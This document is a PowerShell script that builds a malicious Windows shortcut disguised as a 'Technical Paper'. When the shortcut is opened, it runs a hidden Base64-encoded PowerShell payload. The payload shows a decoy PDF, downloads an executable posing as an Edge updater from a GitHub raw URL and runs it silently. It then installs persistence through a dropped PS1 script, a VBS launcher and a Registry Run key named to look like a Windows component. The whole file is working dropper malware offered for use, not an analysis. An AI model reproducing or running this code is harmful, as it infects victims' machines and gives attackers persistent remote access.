# Fixed LNK creation with proper persistence (no VBS syntax errors)
$lnkPath = "$env:USERPROFILE\Desktop\Technical_Paper.lnk"

# The main script that will be encoded and embedded in the LNK
$payload = @'
# Download and open PDF, then run helper.exe, then install persistence
$pdfUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf'
$exeUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe'
$cacheDir = "$env:APPDATA\Microsoft\Windows\Caches"
$librariesDir = "$env:APPDATA\Microsoft\Windows\Libraries"
New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
New-Item -ItemType Directory -Path $librariesDir -Force | Out-Null

$pdfPath = Join-Path $cacheDir 'doc.pdf'
$exePath = Join-Path $cacheDir 'helper.exe'
$vbsPath = Join-Path $librariesDir 'update.vbs'
$ps1Path = Join-Path $librariesDir 'sync.ps1'

# Download and open PDF
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -UseBasicParsing
Start-Process $pdfPath -Verb Open

# Wait 35 seconds then run helper.exe
Start-Sleep -Seconds 35
(New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false)

# --- Persistence: create sync.ps1 ---
$ps1Content = @"
`$exeUrl = '$exeUrl'
`$exePath = '$exePath'
Start-Sleep -Seconds (Get-Random -Min 8 -Max 15)
if (-not (Test-Path `$exePath)) {
    Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -UseBasicParsing
}
(New-Object -ComObject WScript.Shell).Run("`"`$exePath`"", 0, `$false)
"@
Set-Content -Path $ps1Path -Value $ps1Content -Encoding UTF8

# --- Persistence: create update.vbs (clean syntax) ---
$vbsContent = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File "' + $ps1Path + @'"", 0, False
'@
# Fix the VBS path insertion
$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`n" + "WshShell.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File `"$ps1Path`"", 0, False"
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII

# Registry persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsCacheUpdater' -Value "wscript.exe `"$vbsPath`"" -Type String -Force
'@

# Encode the payload to Base64 (UTF-16LE)
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)

# Create the shortcut
$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut($lnkPath)
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
$lnk.IconLocation = "%SystemRoot%\System32\shell32.dll,0"
$lnk.WorkingDirectory = "$env:TEMP"
$lnk.Save()

Write-Host "Fixed LNK created at $lnkPath" -ForegroundColor Green
